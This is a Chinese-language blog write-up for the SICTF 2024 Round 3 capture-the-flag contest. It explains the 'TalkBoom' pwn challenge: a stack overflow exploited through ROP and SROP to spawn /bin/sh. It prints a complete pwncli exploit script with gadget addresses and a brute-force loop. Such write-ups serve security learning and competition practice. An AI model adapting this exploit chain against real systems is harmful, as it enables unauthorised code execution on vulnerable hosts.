<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="排名 rank10，总共做出22题 Pwn TalkBoom 此题题目远程交互的时候会发给你gzip压缩过的elf文件，解压后得到talkboom的源文件，逆向后可以知道，只要输入对应的0x40字符串，就会有一次读入对应大小(0x100，0x30等)，这里会产生栈溢出。   由于远程每次连接下发的elf都不一样，所以首先交互的字符串也都不一样，这里选择爆破它，指定一个固定的地址，然后每次获取这个地">
<meta property="og:type" content="article">
<meta property="og:title" content="2024SICTF ROUND3 wp">
<meta property="og:url" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/index.html">
<meta property="og:site_name" content="hkbin的小博客~">
<meta property="og:description" content="排名 rank10，总共做出22题 Pwn TalkBoom 此题题目远程交互的时候会发给你gzip压缩过的elf文件，解压后得到talkboom的源文件，逆向后可以知道，只要输入对应的0x40字符串，就会有一次读入对应大小(0x100，0x30等)，这里会产生栈溢出。   由于远程每次连接下发的elf都不一样，所以首先交互的字符串也都不一样，这里选择爆破它，指定一个固定的地址，然后每次获取这个地">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%201.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%202.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%203.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%204.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%205.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%206.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%207.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%208.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%209.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2010.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2011.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2012.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2013.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2014.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2015.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2016.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2017.png">
<meta property="og:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled%2018.png">
<meta property="article:published_time" content="2024-02-19T09:16:58.000Z">
<meta property="article:modified_time" content="2024-02-19T10:00:25.463Z">
<meta property="article:author" content="hkbin">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2024/02/19/SICTF-ROUND3-wp/Untitled.png">

<link rel="canonical" href="http://example.com/2024/02/19/SICTF-ROUND3-wp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2024SICTF ROUND3 wp | hkbin的小博客~</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hkbin的小博客~</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="heartbeat fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/19/SICTF-ROUND3-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2024SICTF ROUND3 wp
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-02-19 17:16:58 / 修改时间：18:00:25" itemprop="dateCreated datePublished" datetime="2024-02-19T17:16:58+08:00">2024-02-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>31k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>28 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1>排名</h1>
<p>rank10，总共做出22题</p>
<h1>Pwn</h1>
<h2 id="TalkBoom">TalkBoom</h2>
<p>此题题目远程交互的时候会发给你gzip压缩过的elf文件，解压后得到talkboom的源文件，逆向后可以知道，只要输入对应的0x40字符串，就会有一次读入对应大小(0x100，0x30等)，这里会产生栈溢出。</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled.png" alt="Untitled"></p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%201.png" alt="Untitled"></p>
<p>由于远程每次连接下发的elf都不一样，所以首先交互的字符串也都不一样，这里选择爆破它，指定一个固定的地址，然后每次获取这个地址的字符串，总有一次对应0x100的，这个时候就满足我们的payload。</p>
<p>栈溢出的利用手法：</p>
<p>ROPgadget可以发现有许多gadget，但是rdx不可控，但是有一次性的syscall(0x0000000000405335)。</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%202.png" alt="Untitled"></p>
<p>需要满足execve(”/bin/sh”, 0, 0)，这里先通过这个一次性syscall，调用一次SROP，控制大部分寄存器之后，再通过SROP的rip控制为一次性的syscall地址，最后即可满足sys_execve的条件。</p>
<p>SROP链接：<a target="_blank" rel="noopener" href="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/">https://liuliuliuzy.github.io/2021-11-01-srop学习/</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Use pwncli</span></span><br><span class="line"><span class="comment"># Date: 2024-02-18 14:00:08</span></span><br><span class="line"><span class="comment"># Editor: hkbin</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)</span></span><br><span class="line"><span class="comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">cli_script()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">file_path = <span class="string">&quot;/home/hkbin/Desktop/CTF/competition/2024/SICTF/Talkroom/pwn&quot;</span></span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line">libc: ELF = gift.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt</span>):</span><br><span class="line">    sla(prompt, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># one_gadgets: one_gadget_binary(binary_path, more)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="comment"># Shellcode：ShellcodeMall.amd64</span></span><br><span class="line"><span class="comment"># tcache safelinking: protect_ptr(address, next)</span></span><br><span class="line"><span class="comment"># tcache safelinking_de: reveal_ptr(data)</span></span><br><span class="line"><span class="comment"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span></span><br><span class="line"><span class="comment"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span></span><br><span class="line"><span class="comment"># set_elfbase: set_current_code_base_and_log(addr, offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp:</span></span><br><span class="line"><span class="comment"># for i in range(0x10):</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         new_func()</span></span><br><span class="line"><span class="comment">#     except (EOFError):</span></span><br><span class="line"><span class="comment">#         gift.io = copy_current_io()</span></span><br><span class="line"></span><br><span class="line">CurrentGadgets.set_find_area(find_in_elf=<span class="literal">True</span>, find_in_libc=<span class="literal">False</span>, do_initial=<span class="literal">False</span>)</span><br><span class="line">pop_rdi = CurrentGadgets.pop_rdi_ret()</span><br><span class="line">pop_rsi = CurrentGadgets.pop_rsi_ret()</span><br><span class="line">pop_rbp = CurrentGadgets.pop_rbp_ret()</span><br><span class="line">pop_rax = <span class="number">0x0000000000404df3</span></span><br><span class="line">sh = <span class="number">0x0000000000448184</span></span><br><span class="line"></span><br><span class="line">syscall_onlyonce = <span class="number">0x0000000000405335</span></span><br><span class="line">bss_addr = <span class="number">0x460200</span></span><br><span class="line">magic = <span class="number">0x4055B0</span></span><br><span class="line">read_again = <span class="number">0x404E8D</span></span><br><span class="line">leave_ret = <span class="number">0x000000000042f8eb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SROP</span>(<span class="params">rdi, rsp, rip</span>):</span><br><span class="line">    signframe = SigreturnFrame()</span><br><span class="line">    signframe.rax = constants.SYS_execve</span><br><span class="line">    signframe.rdi = rdi</span><br><span class="line">    signframe.rsi = <span class="number">0x0</span></span><br><span class="line">    signframe.rdx = <span class="number">0x0</span></span><br><span class="line">    signframe.rsp = rsp</span><br><span class="line">    signframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(signframe)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwn</span>():</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> gzip</span><br><span class="line">    <span class="keyword">import</span> shutil</span><br><span class="line">    ru(<span class="string">&quot;This is your Bomb: \n&quot;</span>)</span><br><span class="line">    bomb = ru(<span class="string">&quot;Welcome. Now,you can talk with Sphinx. Good luck.&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bomb:</span><br><span class="line">        log2_ex_highlight(<span class="string">&quot;empty error&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./bomb.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(bomb[<span class="number">2</span>:-<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./bomb.gz&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./bomb.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line">    <span class="comment"># 要解压的文件和解压后的文件路径</span></span><br><span class="line">    gz_filepath = <span class="string">&#x27;./bomb.gz&#x27;</span></span><br><span class="line">    output_filepath = <span class="string">&#x27;./bomb&#x27;</span></span><br><span class="line">    <span class="comment"># 使用gzip打开压缩文件，并使用shutil复制到一个新的文件中</span></span><br><span class="line">    <span class="keyword">with</span> gzip.<span class="built_in">open</span>(gz_filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">            shutil.copyfileobj(f_in, f_out)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;已解压: <span class="subst">&#123;gz_filepath&#125;</span> 到 <span class="subst">&#123;output_filepath&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> elftools.elf.elffile <span class="keyword">import</span> ELFFile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_string_from_elf</span>(<span class="params">file_path, offset</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        elf = ELFFile(file)</span><br><span class="line">        string_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 遍历所有的段（segments）</span></span><br><span class="line">        <span class="keyword">for</span> segment <span class="keyword">in</span> elf.iter_segments():</span><br><span class="line">            <span class="comment"># 检查地址是否在当前segment的范围内</span></span><br><span class="line">            <span class="keyword">if</span> segment[<span class="string">&#x27;p_type&#x27;</span>] == <span class="string">&#x27;PT_LOAD&#x27;</span>:  <span class="comment"># 只有可加载的段才对应内存中的地址</span></span><br><span class="line">                start = segment[<span class="string">&#x27;p_vaddr&#x27;</span>]</span><br><span class="line">                end = start + segment[<span class="string">&#x27;p_memsz&#x27;</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 如果地址在该段的范围内</span></span><br><span class="line">                <span class="keyword">if</span> offset &gt;= start <span class="keyword">and</span> offset &lt; end:</span><br><span class="line">                    <span class="comment"># 计算文件中的偏移</span></span><br><span class="line">                    file_offset = offset - start + segment[<span class="string">&#x27;p_offset&#x27;</span>]</span><br><span class="line">                    file.seek(file_offset)</span><br><span class="line">                    <span class="comment"># 读取字符串，直到遇到null字符</span></span><br><span class="line">                    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                        byte = file.read(<span class="number">1</span>)</span><br><span class="line">                        <span class="keyword">if</span> byte == <span class="string">b&#x27;\x0a&#x27;</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        string_data += byte.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span> string_data</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Address not found in any segment.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">local = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> local:</span><br><span class="line">        <span class="comment"># get_pwn()</span></span><br><span class="line">        file_path = <span class="string">&#x27;./bomb&#x27;</span></span><br><span class="line">        address = <span class="number">0x448380</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file_path = <span class="string">&#x27;./pwn&#x27;</span> <span class="comment"># local</span></span><br><span class="line">        address = <span class="number">0x448240</span> <span class="comment"># local</span></span><br><span class="line">    <span class="comment"># 读取字符串</span></span><br><span class="line">    extracted_string = get_string_from_elf(file_path, address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> extracted_string <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        log2_ex(<span class="string">f&#x27;String at address <span class="subst">&#123;<span class="built_in">hex</span>(address)&#125;</span>: <span class="subst">&#123;extracted_string&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log2_ex(<span class="string">f&quot;No string found at address <span class="subst">&#123;<span class="built_in">hex</span>(address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line">    sl(extracted_string)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">    sa(<span class="string">&quot;Hello?Are you okay??&quot;</span>, flat([</span><br><span class="line">        <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="comment"># rbp</span></span><br><span class="line">        pop_rdi, <span class="number">0</span>,</span><br><span class="line">        pop_rsi, bss_addr,</span><br><span class="line">        read_again,</span><br><span class="line">        <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span>,</span><br><span class="line">        pop_rbp, bss_addr,</span><br><span class="line">        leave_ret</span><br><span class="line">    ]))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line">    s(flat([</span><br><span class="line">        <span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">        pop_rax, <span class="number">15</span>,</span><br><span class="line">        syscall_onlyonce,</span><br><span class="line">        SROP(bss_addr, bss_addr+<span class="number">0x200</span>, syscall_onlyonce)[:-<span class="number">0x18</span>]</span><br><span class="line">    ]))</span><br><span class="line"></span><br><span class="line">    sl(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">    flag = ru(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        get_pwn()</span><br><span class="line">        flag = pwn()</span><br><span class="line">        <span class="keyword">if</span> flag != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            log2_ex_highlight(flag)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">except</span> (EOFError):</span><br><span class="line">        io.close()</span><br><span class="line">        gift.io = copy_current_io()</span><br><span class="line">    <span class="keyword">except</span> TimeoutError:</span><br><span class="line">        io.close()</span><br><span class="line">        gift.io = copy_current_io()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ru(&quot;Good luck.\n&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sl(&quot;TSORBKfHQMOiOKXoiUfbLpgAYSjKzsaQxzLJLwmHGcZqiRtnIZyszItXYUTZNZV&quot;)</span></span><br><span class="line"><span class="string"># sl(&quot;TSORBKfHQMOiOKXoiUfbLpgAYSjKzsaQxzLJLwmHGcZqiRtnIZyszItXYUTZNZV&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># pause()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sa(&quot;Hello?Are you okay??&quot;, flat([</span></span><br><span class="line"><span class="string">    b&#x27;a&#x27;*0x30,</span></span><br><span class="line"><span class="string">    0, # rbp</span></span><br><span class="line"><span class="string">    pop_rdi, 0,</span></span><br><span class="line"><span class="string">    pop_rsi, bss_addr,</span></span><br><span class="line"><span class="string">    read_again,</span></span><br><span class="line"><span class="string">    b&#x27;b&#x27;*0x38,</span></span><br><span class="line"><span class="string">    pop_rbp, bss_addr,</span></span><br><span class="line"><span class="string">    leave_ret</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">s(flat([</span></span><br><span class="line"><span class="string">    b&#x27;/bin/sh\x00&#x27;,</span></span><br><span class="line"><span class="string">    pop_rax, 15,</span></span><br><span class="line"><span class="string">    syscall_onlyonce,</span></span><br><span class="line"><span class="string">    SROP(bss_addr, bss_addr+0x200, syscall_onlyonce)[:-0x18]</span></span><br><span class="line"><span class="string">]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ia()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
